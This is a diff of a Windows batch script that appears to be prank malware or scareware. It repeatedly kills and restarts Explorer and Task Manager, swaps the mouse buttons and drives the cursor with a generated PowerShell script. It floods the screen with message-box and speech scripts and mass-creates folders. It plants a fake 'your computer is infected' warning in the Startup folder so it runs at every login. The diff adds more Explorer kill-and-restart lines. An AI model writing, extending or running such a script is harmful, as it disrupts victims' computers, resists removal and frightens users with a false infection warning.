@@ -27,7 +27,7 @@
 ::Zg8zqx1/OA3MEVWAtB9wZns=
 ::dhA7pRFwIByZRRnKlA==
 ::Zh4grVQjdCyDJGyX8VAjFC5naTa+GGS5E7gZ5vzo08uVoUUUQu0sOK3azvSHLvYW5FHlcZk+6lxxrsIeGQhkWDmdZx0huiBHrmHl
-::YB416Ek+ZW8=
+::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
@@ -37,6 +37,7 @@ powershell -window minimized -command ""
 cd C:\Users\%username%\Desktop
 echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
 TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start
 start
 start
@@ -47,6 +48,8 @@ start
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 echo $Cursor = [system.windows.forms.cursor]::Clip >> Mouse.ps1
 echo [System.Reflection.Assembly]::LoadWithPartialName("system.windows.forms") >> Mouse.ps1
 echo for ($i=1;$i -lt 10000000;$i++) { >> Mouse.ps1
@@ -64,8 +67,9 @@ echo }  >> Mouse.ps1
 echo "#> >> Mouse.ps1
 echo powershell.exe -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\Mouse.ps1" >> M0US3rrR.bat 
 start M0US3rrR.bat 
+start
+TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
-start
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -76,6 +80,8 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -92,6 +98,8 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -106,9 +114,13 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs  
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -117,6 +129,8 @@ echo speaks="jajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajajaj
 echo Set speech=CreateObject("sapi.spvoice") >> n.vbs
 echo speech.Speak speaks >> n.vbs
 cd C:\Users\%username%\Desktop
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
@@ -148,6 +162,8 @@ cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
 cd C:\Users\%username%\Desktop
@@ -170,6 +186,8 @@ echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
 echo RunDll32.exe user32.dll,SetCursorPos >> ppppppppppppppp.bat
@@ -196,8 +214,12 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -205,6 +227,8 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -220,62 +244,8 @@ start hhhh.vbs
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
-start hhhh.vbs 
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start hhhh.vbs 
 start hhhh.vbs 
 start hhhh.vbs 
@@ -306,6 +276,8 @@ start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
@@ -328,6 +300,8 @@ start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
 start JAJAJAJAJA.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start ppppppppppppppp.bat
@@ -346,6 +320,8 @@ start ppppppppppppppp.bat
 start https://www.youtube.com/watch?v=tiRcGyR298s
 start %windir%\system32\WF.msc
 start JAJAJAJAJA.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start %windir%\system32\narrator.exe
 start %windir%\system32\osk.exe
 TASKKILL /F /IM EXPLORER.EXE
@@ -364,6 +340,8 @@ TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 start JAJAJAJAJA.vbs
@@ -377,6 +355,8 @@ start %windir%\system32\notepad.exe
 start %windir%\system32\notepad.exe
 start %windir%\system32\msinfo32.exe
 start %windir%\system32\mspaint.exe
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start %windir%\system32\msra.exe
 start ppppppppppppppp.bat
 start https://www.youtube.com/watch?v=tiRcGyR298s
@@ -398,8 +378,11 @@ start ppppppppppppppp.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJ4.bat
 start JAJAJAJAJA.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start JAJAJAJAJ4.bat
-
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
 start JAJAJAJAJ4.bat
@@ -420,6 +403,8 @@ title %Random%
 CLS
 Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 START EXPLORER.EXE
 
 TASKKILL /F /IM TASKMGR.EXE
@@ -445,6 +430,8 @@ Rundll32 user32,SwapMouseButton
 TASKKILL /F /IM EXPLORER.EXE
 msg * Hola %username%
 START EXPLORER.EXE
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 TASKKILL /F /IM TASKMGR.EXE
 GOTO RE9
 
@@ -452,6 +439,8 @@ GOTO RE9
 title %Random%
 CLS
 start
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start
 msg * Hola %username%
 Rundll32 user32,SwapMouseButton
@@ -470,8 +459,11 @@ start JAJAJAJAJA.vbs
 start
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start s44ss1541DDDDD44.bat
-
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start
 TASKKILL /F /IM EXPLORER.EXE
 start explorer.exe
@@ -494,6 +486,8 @@ md NoConfiesEnGenteDeInternet9
 md NoConfiesEnGenteDeInternet10
 md NoConfiesEnGenteDeInternet11
 md NoConfiesEnGenteDeInternet12
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 md NoConfiesEnGenteDeInternet13
 md NoConfiesEnGenteDeInternet14
 md NoConfiesEnGenteDeInternet15
@@ -516,6 +510,8 @@ md NoConfiesEnGenteDeInternet30
 md NoConfiesEnGenteDeInternet31
 md NoConfiesEnGenteDeInternet32
 md NoConfiesEnGenteDeInternet33
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 md NoConfiesEnGenteDeInternet34
 md NoConfiesEnGenteDeInternet35
 md NoConfiesEnGenteDeInternet36
@@ -530,6 +526,8 @@ md NoConfiesEnGenteDeInternet44
 md NoConfiesEnGenteDeInternet45
 md NoConfiesEnGenteDeInternet46
 md NoConfiesEnGenteDeInternet47
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 md NoConfiesEnGenteDeInternet48
 md NoConfiesEnGenteDeInternet49
 md NoConfiesEnGenteDeInternet50
@@ -553,6 +551,8 @@ echo title %random% %username% %random% >> s2.bat
 echo rundll32.exe user32.dll,MessageBeep >> s2.bat
 echo title %random% %username% %random% >> s2.bat
 echo goto a15 >> s2.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 echo X=MsgBox("Su equipo esta infectado",0+48,"Windows") >> notvi.vbs
 echo X=MsgBox("Le recomendamos que..",0+48,"Windows") >> notvi.vbs
@@ -577,6 +577,8 @@ echo msgbox(" . ") >> 123321.vbs
 echo msgbox(" . ") >> 123321.vbs
 echo msgbox(" . ") >> 123321.vbs
 echo msgbox(" . ") >> 123321.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 echo msgbox(" . ") >> 123321.vbs
 echo msgbox(" . ") >> 123321.vbs
 echo msgbox(" . ") >> 123321.vbs
@@ -602,6 +604,8 @@ echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
@@ -640,6 +644,8 @@ echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
 echo start 123321.vbs >> n071f11123.bat
@@ -681,6 +687,8 @@ start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
+TASKKILL /F /IM EXPLORER.EXE
+start explorer.exe
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
